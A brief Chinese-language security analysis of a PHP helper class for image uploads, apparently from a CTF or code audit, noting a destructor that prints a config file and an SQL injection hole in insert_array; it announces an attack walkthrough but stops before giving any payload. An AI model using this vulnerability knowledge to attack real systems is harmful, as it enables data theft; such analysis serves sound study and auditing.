helper.php

helper.php定义了一个 helper 类，主要用于处理图片上传操作。包含了上传文件信息获取、文件合法性检查、文件信息保存到数据库等功能，还有一个文件查看功能，但该功能默认未开放。在对象销毁时，会尝试读取并输出配置文件的内容。代码存在 SQL 注入风险，因为在构建 SQL 插入语句时没有对用户输入进行充分的转义处理

insert_array 方法中构建 SQL 插入语句时，直接将用户输入的数据拼接到 SQL 语句里，却未对其进行充分的转义处理。下面详细说明如何进行 SQL 注入攻击以及相应的攻击原理。
